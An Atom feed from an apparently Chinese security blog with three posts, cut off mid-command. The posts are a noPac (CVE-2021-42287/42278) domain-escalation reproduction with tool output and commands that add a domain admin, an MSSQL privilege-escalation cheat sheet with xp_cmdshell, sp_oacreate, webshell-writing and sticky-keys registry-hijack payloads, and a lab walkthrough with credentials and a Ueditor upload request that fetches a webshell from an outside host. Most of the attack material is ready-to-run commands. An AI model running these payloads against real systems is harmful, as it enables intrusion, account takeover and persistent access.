<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nice&#39;s Blog</title>
  
  
  <link href="http://nice759.com/atom.xml" rel="self"/>
  
  <link href="http://nice759.com/"/>
  <updated>2022-04-25T07:12:50.445Z</updated>
  <id>http://nice759.com/</id>
  
  <author>
    <name>Nice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278 域内提权复现</title>
    <link href="http://nice759.com/2022/04/25/CVE-2021-42287CVE-2021-42278%20%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83/"/>
    <id>http://nice759.com/2022/04/25/CVE-2021-42287CVE-2021-42278%20%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83/</id>
    <published>2022-04-25T07:52:05.000Z</published>
    <updated>2022-04-25T07:12:50.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在AD认证的过程中，如果存在一个机器账户，此账户的名称和AD机器名（下面为test$）去掉$后相同，当我们请求了TGT以后删除此账户，如果利用此TGT进行正常请求，由于没有这个用户，所以域控无法正确来解密此票据。<br>但是域控有一个机制，当数据库中未检索到这个账户，会寻找samaccountname为此账户的用户，此时就可以利用 S4U2self 去请求DC秘钥加密的TS票据。</p><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>利用脚本地址：</p><p><a href="https://github.com/cube0x0/noPac%EF%BC%8C%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E4%B8%BAexe%E6%96%87%E4%BB%B6%E3%80%82">https://github.com/cube0x0/noPac，需要自己编译为exe文件。</a></p><p>运行noPac.exe需要.net环境，下载地址：<a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718</a></p><p>执行命令，查看是否存在漏洞，顺便可以拿到域控的机器账号，看到这里的票据大小为537，有师傅提醒说如果票据大于1000，就是添加了PAC，没有这个漏洞了。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">noPac.exe  scan -domain openx.com -user xxx -pass 123456     &#x2F;&#x2F;账号密码为域成员的</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/HQSp3zar6e9iuoW.png" alt="图片.png"></p><p>可以看到是存在漏洞，能拿到票据。执行一下命令传递票据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe -domain openx.com -user xxx -pass 123456 &#x2F;dc xxx.com &#x2F;mAccount nice &#x2F;mPassword 123456 &#x2F;service cifs &#x2F;ptt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[+] Distinguished Name &#x3D; CN&#x3D;nice,CN&#x3D;Computers,DC&#x3D;openx,DC&#x3D;com</span><br><span class="line">[+] Machine account nice added</span><br><span class="line">[+] Machine account nice attribute serviceprincipalname cleared</span><br><span class="line">[+] Machine account nice attribute samaccountname updated</span><br><span class="line">[+] Got TGT for xxx.com</span><br><span class="line">[+] Machine account nice attribute samaccountname updated</span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Using domain controller: xxx.com (192.168.10.100)</span><br><span class="line">[*] Building S4U2self request for: &#39;xxx@xxx.COM&#39;</span><br><span class="line">[*] Sending S4U2self request</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Substituting alternative service name &#39;cifs&#x2F;xxx.com&#39;</span><br><span class="line">[*] Got a TGS for &#39;administrator&#39; to &#39;cifs@xxx.COM&#39;</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFnjCCBZqgAwIBBaEDAgEWooIEoTCCBJ1hggSZMIIElaADAgEFoQsbCU9QRU5YLkNPTaIkMCKgAwIBAaEbMBkbBGNpZnMbEVlaWUFEMDEub3BlbnguY29to4IEWTCCBFWgAwIBEqEDAgELooIERwSCBENN3T4g9W&#x2F;r0LRLvvKBjn9lcPDa6kGg8gvAB3NU4&#x2F;U+uceIqzpdB2TjTmIS8pXtjYoL7uwbrbsH5KraK+J9YMPOFlaNAP2S4mBypXhDWY1bbtBGRrnS76auqezmPx9bz+&#x2F;Xy2XbaepbWIz0S79DLWCqECX5SeRlLBkNVa6pvTrKMWd7gJ6zOW7XEh6WKEbuRstOmrhzOXJe7ONkKkw9wSHm280jCNVB4nB8p2EL&#x2F;MsbgFjeii0A6rdF8HuNvtEwt7rpfuHtNQ5g3e2LTY2JUx1U8c53EWuLuBBvXuOTK+&#x2F;WPGlzmRP54&#x2F;vCLUoUadQwsY2XvcDJ+wyiJ7A9A8F5&#x2F;RhNx3OSPkwWN8CMWTZOqMA4&#x2F;EKcDJXqrYvQYKkpgW7CYNg1fb&#x2F;ZB9jGiraisP4oKOhxxOk2&#x2F;ia3ngRFOw0OGMyCuvld6QqGGiI2VxPA1A+&#x2F;bR9c0TOZ5ennzlq4FFRtDab8UUjgrVX9B9DhgJ95f4ZmIDu8sXAo6lyU7TfLsLbOkclWYdFHrAW3U&#x2F;yuYDZuJqMuSfSxuRHN6EuM0EtrpgD0BygDBSP95Iqgx6bPsCnQ843Z6cQrANH0rv+OGmwaGGy2mRZ7hxPVS3GM44t2gSxSPkp8YtOqdU4j&#x2F;Qnui61AfJbfXFfn4TF1bgQ9h7mRs&#x2F;RkxuzocUiqKbnKd8sCuNv07KVy8J7bjuj+5olIyf9asFvMTLQZfjLiD8h2gDVS6tnRcsr6hwPkcuo7LYimPi8RVKvUI9OY4MidBHuH6qMfZ+vcEz+OJ0+TdnD9G0Y9tYOBAD8kw8XDjDG1CO5W&#x2F;FL5tPVyMbi5Em7ZLBDY3UuEn5nbsn4xmmCPvYwZ6nv1O&#x2F;nTbyP1mUBYhO26T264pNUQJBBYEWu6rjlh0+Akfrh2HmjCo+3nWlWY4kmu6q30GS709UIKuHT5CEMRZglq&#x2F;rWXlT&#x2F;I5fbp&#x2F;PHqbz&#x2F;TCTTskbpfhR3qGpeaPo7W76dK5AHkJppgbm8ptW6xsT3cmq3Rigw9GsK0zpFkl1p6irpinR3Fx2MP&#x2F;Q&#x2F;F9zuGJmkDryI1nirhMmEc3zp4JtocjphzHsuu81iTaJKMrOliiNxCUvarckxibgJ3UY050CQeCHw9mklX+dy8NCqn4SkHVfeKP3&#x2F;KBEKGgjtjswQsUv4SCqjg7e8bQ&#x2F;o6Eu4SxQhHAZb3LJAMZLJ8cOyF0&#x2F;mQkFECokDN2w9K&#x2F;rnIp8uUTVmjILD+xdRwWkHvsAXNhefHYPWgrcNEiOx3gRO8GFXYGUvTNMoKy4wR3bd4DDOtLlaSKWw2yVqeXGD9wCUJWszTP9kkTL8N4p+4tNS7QbOD4ER7Sk4XTwDwoIgCSh5y0qufg6XC&#x2F;rhLVCJbbLDT22Fum9j5R20GW+piEnYNE&#x2F;WyUBGgwC6dCsoAQPtUQXVjT2acjVIaO&#x2F;zIa4+tqUbh9Ht4fRZQ9TS1geGmqhsaHGHdTXQW8bWdgaOB6DCB5aADAgEAooHdBIHafYHXMIHUoIHRMIHOMIHLoCswKaADAgESoSIEIH&#x2F;FFW&#x2F;pGFP9uW6u1GvFufbQyUNkAuPabUXSliDzIz3ooQsbCU9QRU5YLkNPTaIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMjA0MjExMDEwMjFaphEYDzIwMjIwNDIxMjAxMDIxWqcRGA8yMDIyMDQyODEwMTAyMVqoCxsJT1BFTlguQ09NqSQwIqADAgEBoRswGRsEY2lmcxsRWVpZQUQwMS5vcGVueC5jb20&#x3D;</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure><p>域内多了一个nice的机器<br><img src="https://s2.loli.net/2022/04/25/BQiXbVjuzvNl9fC.png" alt="图片.png"></p><p>添加域管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user niceadmin 145216 &#x2F;add &#x2F;domain</span><br><span class="line">net group &quot;Domain Admins&quot; niceadmin &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/U7vhxblGFeruSf6.png" alt="图片.png"></p><p>域管都有了，接下来…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;在AD认证的过程中，如果存在一个机器账户，此账户的名称和AD机器名（下面为test$）去掉$后相同，当我们请求了TGT以后删除此账户，如果利</summary>
      
    
    
    
    <category term="提权" scheme="http://nice759.com/Categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="CVE-2021-42287" scheme="http://nice759.com/tags/CVE-2021-42287/"/>
    
    <category term="CVE-2021-42278" scheme="http://nice759.com/tags/CVE-2021-42278/"/>
    
    <category term="域内提权" scheme="http://nice759.com/tags/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>MSSQL提权</title>
    <link href="http://nice759.com/2022/04/25/MSSQL%E6%8F%90%E6%9D%83/"/>
    <id>http://nice759.com/2022/04/25/MSSQL%E6%8F%90%E6%9D%83/</id>
    <published>2022-04-25T06:52:05.000Z</published>
    <updated>2022-04-25T06:55:58.422Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境；<br>端口号：1433</p><ul><li>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select @@VERSION  #查看版本</span><br><span class="line">SELECT name FROM MASter..SysDatabASes ORDER BY name      #获取MSSQL中的所有数据库名</span><br><span class="line">SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype &#x3D; &#39;U&#39; and sysstat&lt;200 #查询所有数据库中的表名</span><br><span class="line">exec xp_dirtree &#39;c:&#39;        # 列出所有c:\文件、目录、子目录</span><br><span class="line">exec xp_dirtree &#39;c:&#39;,1      # 只列c:\目录</span><br><span class="line">exec xp_dirtree &#39;c:&#39;,1,1    # 列c:\目录、文件</span><br><span class="line">exec xp_subdirs &#39;C:&#39;;       # 只列c:\目录</span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) # 判断是否是SA权限</span><br><span class="line">select is_member(&#39;db_owner&#39;)        # 判断是否是db_owner权限  </span><br><span class="line">select is_srvrolemember(&#39;public&#39;)   # 判断是否是public权限</span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;   #查看OLE Automation Procedures的当前设置</span><br></pre></td></tr></table></figure></li></ul><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><p>xp_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp_cmdshell来进行提权。<br>前提：</p><ul><li>sa权限</li><li>可以执行sql语句</li><li>xp_cmdshell扩展开启<br>在MSSQL2005之后，默认关闭了这个扩展<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--sp_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回0，失败返回1</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;,1;  # 1表示开启，0表示关闭;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &quot;whoami&quot;</span><br><span class="line">master..xp_cmdshell &#39;whoami&#39;    </span><br><span class="line">EXEC master..xp_cmdshell &quot;whoami&quot;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure></li></ul><p>如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;D:\\xplog70.dll&#39;</span><br></pre></td></tr></table></figure><h2 id="sp-makewebtask"><a href="#sp-makewebtask" class="headerlink" title="sp_makewebtask"></a>sp_makewebtask</h2><p>前提：</p><ul><li>sa权限</li><li>可以执行sql语句</li><li>存在sp_makewebtask扩展</li><li>写webshell需要知道路径<br>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_makewebtask &#39;c:\www\testwr.asp&#39;,&#39;select&#39;&#39;&lt;%execute(request(&quot;zz&quot;))%&gt;&#39;&#39; &#39;</span><br></pre></td></tr></table></figure>更多关于sp_makewebtask的用法可以参考<a href="https://www.shuzhiduo.com/A/rV573q8E5P/">https://www.shuzhiduo.com/A/rV573q8E5P/</a></li></ul><h2 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h2><p>sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。<br>sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。<br>前提：</p><ul><li>sa权限</li><li>OLE Automation Procedures选项开启<br>查看sp_oacreate状态<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;SP_OACREATE&#39;; #返回1表示开启</span><br></pre></td></tr></table></figure>启用OLE Automation Procedures选项<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#39;Ole Automation Procedures&#39;,1;</span><br><span class="line">reconfigure;</span><br><span class="line"></span><br></pre></td></tr></table></figure>利用：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写入文件，成功执行返回0</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\sqltest.txt&#39;;</span><br><span class="line">添加管理员用户</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c &quot;net user hacker admin@1234 &#x2F;add&quot; &gt;c:\\sqltest.txt&#39;;</span><br><span class="line">wscript.shell&#39;,@shell output </span><br><span class="line">exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c &quot;net localgroup administrators hacker &#x2F;add&quot; &gt;c:\\sqltest.txt&#39;;</span><br></pre></td></tr></table></figure>更多参考 <a href="https://blog.csdn.net/Fly_hps/article/details/80301792">https://blog.csdn.net/Fly_hps/article/details/80301792</a></li></ul><h2 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h2><p>通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。<br>前提：</p><ul><li><p>未禁止注册表编辑（即写入功能）</p></li><li><p>xp_regwrite启用</p></li></ul><p>查看xp_regwrite是否启用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;xp_regwrite&#39;</span><br></pre></td></tr></table></figure><p>xp_regwrite开启:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_regwrite&#39;,1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>利用regwrite函数修改组注册表进行劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入粘滞键cmd.exe</span><br><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure><h2 id="SQL-Server-沙盒提权"><a href="#SQL-Server-沙盒提权" class="headerlink" title="SQL Server 沙盒提权"></a>SQL Server 沙盒提权</h2><p>开启沙盒：</p><p>1<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br>然后利用jet.oledb执行命令：</p><p>1<br>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\windows\system32\ias\dnary.mdb’,’select shell(“whoami”)’)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实还有很多提权的方法，像CLR、Agent Job等，后续再进行补充~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MSSQL&quot;&gt;&lt;a href=&quot;#MSSQL&quot; class=&quot;headerlink&quot; title=&quot;MSSQL&quot;&gt;&lt;/a&gt;MSSQL&lt;/h1&gt;&lt;p&gt;MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型</summary>
      
    
    
    
    <category term="提权" scheme="http://nice759.com/Categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="mssql" scheme="http://nice759.com/tags/mssql/"/>
    
  </entry>
  
  <entry>
    <title>暗月atk123靶场渗透</title>
    <link href="http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2022-04-06T10:47:12.000Z</published>
    <updated>2022-04-06T10:48:19.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这个靶场来自暗月内网渗透</p><p>主要考点</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">站库分离外网打点</span><br><span class="line">过360全家桶</span><br><span class="line">过windwos defender</span><br><span class="line">过火绒</span><br><span class="line">内网漫游</span><br><span class="line">多层网络渗透</span><br><span class="line">横向渗透</span><br><span class="line">jwt token密钥破解</span><br><span class="line">权限提升</span><br><span class="line">域渗透</span><br><span class="line">phpmyadmin写shell</span><br><span class="line">sqlserver提权</span><br></pre></td></tr></table></figure><p>靶场拓扑</p><p><img src="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png" alt="image.png"></p><p>账号信息</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">12server-web1 本地管理员和账号 administrator QWEasd.123</span><br><span class="line"> www.ackmoon.com admin password-moon</span><br><span class="line"> 12server-web2 本地管理员账号和密码 administrator QWEasd.999</span><br><span class="line"> mysql root Qweasdzxc5 域普通用户 web2 QWEasd.7788</span><br><span class="line"> 12server-data1 本地管理员账号和密码 administrator QWEasd.789x</span><br><span class="line"> sqlserver sa pass123@.com</span><br><span class="line"> 12server-data2 本地管理员账号和密码 administrator P@55w0rd!</span><br><span class="line"> 16server-dc 域管理员 administrator P@55w0rd!</span><br></pre></td></tr></table></figure><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>访问<a href="http://www.ackmoon.com/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%98%AFHDHCMS%E6%90%AD%E5%BB%BA%E7%9A%84%E7%BD%91%E7%AB%99">http://www.ackmoon.com/可以看到是HDHCMS搭建的网站</a></p><p><img src="https://s2.loli.net/2022/04/05/4v2Kg6JlUyWcqXB.png" alt="image.png"></p><p>来找一下历史漏洞</p><p>发现cnvd上存在一个伪造cookie登录后台的，但是并没有找到相关细节</p><p><img src="https://s2.loli.net/2022/04/05/waU5VFLCO1MuIAH.png" alt="image.png"></p><p>其他的信息收集</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扫目录：发现admin后台目录</span><br><span class="line">看前端源码：没发现</span><br><span class="line">乱点：没错，就是乱点</span><br><span class="line">后台账户爆破：没结果</span><br><span class="line">后台用户注册</span><br><span class="line">Cookie格式，尝试伪造</span><br></pre></td></tr></table></figure><p>搜索框  ‘ 尝试，有报错（乱点的）</p><p><img src="https://s2.loli.net/2022/04/05/PSDOQecbWNTAoxa.png" alt="image.png"></p><p>这是注出了一个0day？</p><p><img src="https://s2.loli.net/2022/04/05/2FhWyoqPtCBTkaJ.png" alt="image.png"></p><p>与此同时，通过注册用户看看后台</p><p>发现存在<strong>百度Ueditor 1.4.3</strong></p><p><img src="https://s2.loli.net/2022/04/05/hckamoPFSqrHpNT.png" alt="image.png"></p><p>这个编辑器存在一个任意文件上传漏洞，我们利用一下</p><p>找到上传接口 <strong>/admin/net/controller.ashx?action=catchimage</strong></p><p>构造上传</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;net&#x2F;controller.ashx?action&#x3D;catchimage HTTP&#x2F;1.1</span><br><span class="line">Host: www.ackmoon.com</span><br><span class="line">Content-Length: 50</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.4844.84 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">source[]&#x3D;http:&#x2F;&#x2F;192.168.3.187:8080&#x2F;shell.jpg.?aspx</span><br></pre></td></tr></table></figure><p>蚂蚁连接</p><p><img src="https://s2.loli.net/2022/04/05/BogF9L3I2nT4EjO.png" alt="image.png"></p><p>能连，执行命令会被拦截，换一个马试试</p><p><img src="https://s2.loli.net/2022/04/05/IwyxJVPgNnkivRU.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/05/nIqE5oLsvuQYVgP.png" alt="image.png"></p><p>杀软识别，360全家桶</p><p><img src="https://s2.loli.net/2022/04/05/Oc4zyL3hAd8Deag.png" alt="image.png"></p><p>用ZheTian框架免杀上线</p><p><img src="https://s2.loli.net/2022/04/05/yPQpM6ZTjiX9wVI.png" alt="image.png"></p><p>烂土豆提权</p><p><img src="https://s2.loli.net/2022/04/05/DvSqznYhodIFOm4.png" alt="image.png"></p><p>webshell翻一翻，找到数据库配置文件</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库地址：192.168.22.133</span><br><span class="line">用户名&#x2F;密码：sa&#x2F;pass123@.com</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/05/rOQBCNDpGA2Mft7.png" alt="image.png"></p><p>cs加代理，本地挂代理用navicat连接</p><p><img src="https://s2.loli.net/2022/04/05/97OP3mwa1pIBsUh.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/05/GeKOPJzj9dV2EAo.png" alt="image.png"></p><p>关于xp_cmdshell的一些判断</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">判断权限是不是sa </span><br><span class="line"></span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) </span><br><span class="line"></span><br><span class="line">返回是1说明是sa </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">判断xp_cmdshell扩展存储是否存在 </span><br><span class="line"></span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; AND name&#x3D; &#39;xp_cmdshell&#39; </span><br><span class="line">返回为1则证明存在 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">判断xp_regread扩展存储过程是否存在 </span><br><span class="line"></span><br><span class="line">select count(*) from master.dbo.sysobjects where name&#x3D;&#39;xp_regread&#39;  </span><br><span class="line">返回1证明存在 </span><br></pre></td></tr></table></figure><p>大费周折之后发现用powershell的时候直接拒绝使用了</p><p>百度发现可以用sp_oacreate执行命令</p><p>开启sp_oacreate：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">exec sp_configure &#39;Ole Automation Procedures&#39;, 1;  </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>测试出网情况</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Declare @runshell INT Exec SP_OACreate &#39;wscript.shell&#39;,@runshell out Exec SP_OAMeTHOD 